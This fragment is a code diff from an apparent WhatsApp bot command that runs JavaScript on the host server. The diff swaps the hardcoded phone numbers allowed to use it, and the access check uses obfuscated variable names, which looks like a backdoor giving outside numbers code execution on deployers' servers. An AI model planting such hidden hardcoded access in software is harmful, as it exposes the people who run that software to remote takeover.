@@ -27,8 +27,8 @@ const { cmd, commands } = require('../command')
  desc: "Runs js code on node server." 
 }, 
 async(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply}) => {
-const qpmzalgrk = ['94725881990'];
-const ftpwgmecn = ['94762280384'];
+const qpmzalgrk = ['94703394549'];
+const ftpwgmecn = ['94705646240'];
 const qkevskwbshskwnsbsnensbsnsbsvshbsnsbebemebekebdmenebememsbdbs = qpmzalgrk.includes(senderNumber) || ftpwgmecn.includes(senderNumber)
 	    if (!qkevskwbshskwnsbsnensbsnsbsvshbsnsbebemebekebdmenebememsbdbs) return reply("*THIS DEVELOPER COMMAND* 📛 ")
  try 
